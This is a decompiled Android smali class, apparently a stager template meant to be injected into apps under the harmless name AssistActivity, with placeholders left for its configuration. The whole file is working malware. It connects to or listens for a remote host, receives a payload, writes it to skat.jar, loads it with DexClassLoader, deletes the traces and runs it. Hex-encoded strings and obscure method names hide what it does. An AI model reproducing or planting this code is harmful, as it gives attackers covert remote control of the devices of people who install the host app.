.class public PLACEHOLDER/AssistActivity;
.super Ljava/lang/Object;
.source "AssistActivity.java"


# static fields
.field public static final array:[B

.field private static parameters:[Ljava/lang/String;

.field public static retry_total:J

.field public static retry_wait:J

.field public static final tArr:[B

.field public static timeoutOfTheConn:J

.field public static whenTheSessionExpires:J


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .prologue
    .line 19
    const/16 v0, FACEPALM

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    sput-object v0, PLACEHOLDER/AssistActivity;->array:[B

    .line 21
    const/16 v0, 0x16

    new-array v0, v0, [B

    fill-array-data v0, :array_1

    sput-object v0, PLACEHOLDER/AssistActivity;->tArr:[B

    return-void

    .line 19
    nop

    :array_0
    .array-data 1
        BEARDEDGREATNESS
    .end array-data

    .line 21
    nop

    :array_1
    .array-data 1
        0x54t
        0x54t
        0x54t
        0x54t
        0x36t
        0x30t
        0x34t
        0x38t
        0x30t
        0x30t
        0x2dt
        0x33t
        0x30t
        0x30t
        0x2dt
        0x33t
        0x36t
        0x30t
        0x30t
        0x2dt
        0x31t
        0x30t
    .end array-data
.end method

.method public constructor <init>()V
    .locals 0

    .prologue
    .line 17
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static doThis(Landroid/content/Context;)V
    .locals 1
    .param p0, "context"    # Landroid/content/Context;

    .prologue
    .line 30
    invoke-virtual {p0}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    move-result-object v0

    invoke-virtual {v0}, Ljava/io/File;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0},PLACEHOLDER/AssistActivity;->pathToStartIn(Ljava/lang/String;)V

    .line 31
    return-void
.end method

.method private static leesEnLoopDieDing(Ljava/io/DataInputStream;Ljava/io/OutputStream;[Ljava/lang/String;)V
    .locals 15
    .param p0, "in"    # Ljava/io/DataInputStream;
    .param p1, "out"    # Ljava/io/OutputStream;
    .param p2, "parameters"    # [Ljava/lang/String;
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    .line 109
    const/4 v11, 0x0

    aget-object v7, p2, v11

    .line 110
    .local v7, "path":Ljava/lang/String;
    const/16 v11, 0x8

    new-array v0, v11, [B

    fill-array-data v0, :array_0

    .line 111
    .local v0, "arr1":[B
    const/16 v11, 0x8

    new-array v1, v11, [B

    fill-array-data v1, :array_1

    .line 114
    .local v1, "arr2":[B
    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v11, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    sget-char v12, Ljava/io/File;->separatorChar:C

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    move-result-object v11

    new-instance v12, Ljava/lang/String;

    invoke-direct {v12, v0}, Ljava/lang/String;-><init>([B)V

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    .line 115
    .local v9, "pathToTheFile":Ljava/lang/String;
    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v11, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    sget-char v12, Ljava/io/File;->separatorChar:C

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    move-result-object v11

    new-instance v12, Ljava/lang/String;

    invoke-direct {v12, v1}, Ljava/lang/String;-><init>([B)V

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    .line 117
    .local v8, "pathToTheDex":Ljava/lang/String;
    invoke-virtual {p0}, Ljava/io/DataInputStream;->readInt()I

    move-result v11

    new-array v3, v11, [B

    .line 118
    .local v3, "core":[B
    invoke-virtual {p0, v3}, Ljava/io/DataInputStream;->readFully([B)V

    .line 119
    new-instance v2, Ljava/lang/String;

    invoke-direct {v2, v3}, Ljava/lang/String;-><init>([B)V

    .line 120
    .local v2, "classFile":Ljava/lang/String;
    invoke-virtual {p0}, Ljava/io/DataInputStream;->readInt()I

    move-result v11

    new-array v3, v11, [B

    .line 121
    invoke-virtual {p0, v3}, Ljava/io/DataInputStream;->readFully([B)V

    .line 122
    new-instance v4, Ljava/io/File;

    invoke-direct {v4, v9}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 123
    .local v4, "file":Ljava/io/File;
    invoke-virtual {v4}, Ljava/io/File;->exists()Z

    move-result v11

    if-nez v11, :cond_0

    .line 124
    invoke-virtual {v4}, Ljava/io/File;->createNewFile()Z

    .line 126
    :cond_0
    new-instance v5, Ljava/io/FileOutputStream;

    invoke-direct {v5, v4}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    .line 127
    .local v5, "fop":Ljava/io/FileOutputStream;
    invoke-virtual {v5, v3}, Ljava/io/FileOutputStream;->write([B)V

    .line 128
    invoke-virtual {v5}, Ljava/io/FileOutputStream;->flush()V

    .line 129
    invoke-virtual {v5}, Ljava/io/FileOutputStream;->close()V

    .line 130
    new-instance v11, Ldalvik/system/DexClassLoader;

    const-class v12, PLACEHOLDER/AssistActivity;

    invoke-virtual {v12}, Ljava/lang/Class;->getClassLoader()Ljava/lang/ClassLoader;

    move-result-object v12

    invoke-direct {v11, v9, v7, v7, v12}, Ldalvik/system/DexClassLoader;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V

    invoke-virtual {v11, v2}, Ldalvik/system/DexClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v6

    .line 131
    .local v6, "myClass":Ljava/lang/Class;, "Ljava/lang/Class<*>;"
    invoke-virtual {v6}, Ljava/lang/Class;->newInstance()Ljava/lang/Object;

    move-result-object v10

    .line 132
    .local v10, "stage":Ljava/lang/Object;
    invoke-virtual {v4}, Ljava/io/File;->delete()Z

    .line 133
    new-instance v11, Ljava/io/File;

    invoke-direct {v11, v8}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v11}, Ljava/io/File;->delete()Z

    .line 134
    const-string v11, "start"

    const/4 v12, 0x3

    new-array v12, v12, [Ljava/lang/Class;

    const/4 v13, 0x0

    const-class v14, Ljava/io/DataInputStream;

    aput-object v14, v12, v13

    const/4 v13, 0x1

    const-class v14, Ljava/io/OutputStream;

    aput-object v14, v12, v13

    const/4 v13, 0x2

    const-class v14, [Ljava/lang/String;

    aput-object v14, v12, v13

    invoke-virtual {v6, v11, v12}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v11

    const/4 v12, 0x3

    new-array v12, v12, [Ljava/lang/Object;

    const/4 v13, 0x0

    aput-object p0, v12, v13

    const/4 v13, 0x1

    aput-object p1, v12, v13

    const/4 v13, 0x2

    aput-object p2, v12, v13

    invoke-virtual {v11, v10, v12}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 135
    const/4 v11, 0x0

    invoke-static {v11}, Ljava/lang/System;->exit(I)V

    .line 136
    return-void

    .line 110
    :array_0
    .array-data 1
        0x73t
        0x6bt
        0x61t
        0x74t
        0x2et
        0x6at
        0x61t
        0x72t
    .end array-data

    .line 111
    :array_1
    .array-data 1
        0x73t
        0x6bt
        0x61t
        0x74t
        0x2et
        0x64t
        0x65t
        0x78t
    .end array-data
.end method

.method private static maakDieStageVanTcp(Ljava/lang/String;)V
    .locals 8
    .param p0, "url"    # Ljava/lang/String;
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    const/4 v7, 0x2

    .line 92
    const-string v5, ":"

    invoke-virtual {p0, v5}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 93
    .local v0, "dinge":[Ljava/lang/String;
    aget-object v5, v0, v7

    invoke-static {v5}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v2

    .line 94
    .local v2, "port":I
    const/4 v5, 0x1

    aget-object v5, v0, v5

    const-string v6, "/"

    invoke-virtual {v5, v6}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v5

    aget-object v1, v5, v7

    .line 95
    .local v1, "host":Ljava/lang/String;
    const-string v5, ""

    invoke-virtual {v1, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_1

    .line 96
    new-instance v3, Ljava/net/ServerSocket;

    invoke-direct {v3, v2}, Ljava/net/ServerSocket;-><init>(I)V

    .line 97
    .local v3, "server":Ljava/net/ServerSocket;
    invoke-virtual {v3}, Ljava/net/ServerSocket;->accept()Ljava/net/Socket;

    move-result-object v4

    .line 98
    .local v4, "sock":Ljava/net/Socket;
    invoke-virtual {v3}, Ljava/net/ServerSocket;->close()V

    .line 102
    .end local v3    # "server":Ljava/net/ServerSocket;
    :goto_0
    if-eqz v4, :cond_0

    .line 103
    const/16 v5, 0x1f4

    invoke-virtual {v4, v5}, Ljava/net/Socket;->setSoTimeout(I)V

    .line 104
    new-instance v5, Ljava/io/DataInputStream;

    invoke-virtual {v4}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/io/DataInputStream;-><init>(Ljava/io/InputStream;)V

    new-instance v6, Ljava/io/DataOutputStream;

    invoke-virtual {v4}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v7

    invoke-direct {v6, v7}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    sget-object v7, PLACEHOLDER/AssistActivity;->parameters:[Ljava/lang/String;

    invoke-static {v5, v6, v7}, PLACEHOLDER/AssistActivity;->leesEnLoopDieDing(Ljava/io/DataInputStream;Ljava/io/OutputStream;[Ljava/lang/String;)V

    .line 106
    :cond_0
    return-void

    .line 100
    .end local v4    # "sock":Ljava/net/Socket;
    :cond_1
    new-instance v4, Ljava/net/Socket;

    invoke-direct {v4, v1, v2}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V

    .restart local v4    # "sock":Ljava/net/Socket;
    goto :goto_0
.end method

.method public static main([Ljava/lang/String;)V
    .locals 16
    .param p0, "args"    # [Ljava/lang/String;
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    .line 51
    if-eqz p0, :cond_0

    .line 52
    const/4 v12, 0x1

    new-array v12, v12, [Ljava/lang/String;

    const/4 v13, 0x0

    new-instance v14, Ljava/io/File;

    const-string v15, "."

    invoke-direct {v14, v15}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v14}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v14

    aput-object v14, v12, v13

    sput-object v12, PLACEHOLDER/AssistActivity;->parameters:[Ljava/lang/String;

    .line 54
    :cond_0
    new-instance v12, Ljava/lang/String;

    sget-object v13, PLACEHOLDER/AssistActivity;->tArr:[B

    invoke-direct {v12, v13}, Ljava/lang/String;-><init>([B)V

    const/4 v13, 0x4

    invoke-virtual {v12, v13}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v12

    const-string v13, "-"

    invoke-virtual {v12, v13}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v3

    .line 57
    .local v3, "timeouts":[Ljava/lang/String;
    const/4 v12, 0x0

    :try_start_0
    aget-object v12, v3, v12

    invoke-static {v12}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v12

    int-to-long v10, v12

    .line 58
    .local v10, "sessionExpiry":J
    const/4 v12, 0x1

    aget-object v12, v3, v12

    invoke-static {v12}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v12

    int-to-long v0, v12

    .line 59
    .local v0, "commTimeout":J
    const/4 v12, 0x2

    aget-object v12, v3, v12

    invoke-static {v12}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v12

    int-to-long v6, v12

    .line 60
    .local v6, "retryTotal":J
    const/4 v12, 0x3

    aget-object v12, v3, v12

    invoke-static {v12}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v12

    int-to-long v8, v12

    .line 61
    .local v8, "retryWait":J
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v4

    .line 63
    .local v4, "payloadStart":J
    sget-object v12, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    invoke-virtual {v12, v10, v11}, Ljava/util/concurrent/TimeUnit;->toMillis(J)J

    move-result-wide v12

    add-long/2addr v12, v4

    sput-wide v12, PLACEHOLDER/AssistActivity;->whenTheSessionExpires:J

    .line 64
    sget-object v12, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    invoke-virtual {v12, v0, v1}, Ljava/util/concurrent/TimeUnit;->toMillis(J)J

    move-result-wide v12

    sput-wide v12, PLACEHOLDER/AssistActivity;->timeoutOfTheConn:J

    .line 65
    sget-object v12, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    invoke-virtual {v12, v6, v7}, Ljava/util/concurrent/TimeUnit;->toMillis(J)J

    move-result-wide v12

    sput-wide v12, PLACEHOLDER/AssistActivity;->retry_total:J

    .line 66
    sget-object v12, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    invoke-virtual {v12, v8, v9}, Ljava/util/concurrent/TimeUnit;->toMillis(J)J

    move-result-wide v12

    sput-wide v12, PLACEHOLDER/AssistActivity;->retry_wait:J

    .line 69
    new-instance v12, Ljava/lang/String;

    sget-object v13, PLACEHOLDER/AssistActivity;->array:[B

    invoke-direct {v12, v13}, Ljava/lang/String;-><init>([B)V

    const/4 v13, 0x4

    invoke-virtual {v12, v13}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v2

    .line 72
    .local v2, "diePlekWaarTeGaan":Ljava/lang/String;
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v12

    sget-wide v14, PLACEHOLDER/AssistActivity;->retry_total:J

    add-long/2addr v14, v4

    cmp-long v12, v12, v14

    if-gez v12, :cond_1

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v12

    sget-wide v14, PLACEHOLDER/AssistActivity;->whenTheSessionExpires:J

    cmp-long v12, v12, v14

    if-gez v12, :cond_1

    .line 82
    const-string v12, "tcp"

    invoke-virtual {v2, v12}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v12

    if-eqz v12, :cond_1

    .line 83
    invoke-static {v2}, PLACEHOLDER/AssistActivity;->maakDieStageVanTcp(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/NumberFormatException; {:try_start_0 .. :try_end_0} :catch_0

    .line 88
    .end local v0    # "commTimeout":J
    .end local v2    # "diePlekWaarTeGaan":Ljava/lang/String;
    .end local v4    # "payloadStart":J
    .end local v6    # "retryTotal":J
    .end local v8    # "retryWait":J
    .end local v10    # "sessionExpiry":J
    :cond_1
    :goto_0
    return-void

    .line 86
    :catch_0
    move-exception v12

    goto :goto_0
.end method

.method public static pathToStartIn(Ljava/lang/String;)V
    .locals 2
    .param p0, "path"    # Ljava/lang/String;

    .prologue
    .line 46
    const/4 v0, 0x1

    new-array v0, v0, [Ljava/lang/String;

    const/4 v1, 0x0

    aput-object p0, v0, v1

    sput-object v0, PLACEHOLDER/AssistActivity;->parameters:[Ljava/lang/String;

    .line 47
    invoke-static {}, PLACEHOLDER/AssistActivity;->startAsync()V

    .line 48
    return-void
.end method

.method public static startAsync()V
    .locals 1

    .prologue
    .line 34
    new-instance v0, PLACEHOLDER/AssistActivity1;

    invoke-direct {v0}, PLACEHOLDER/AssistActivity1;-><init>()V

    invoke-virtual {v0}, PLACEHOLDER/AssistActivity1;->start()V

    .line 43
    return-void
.end method
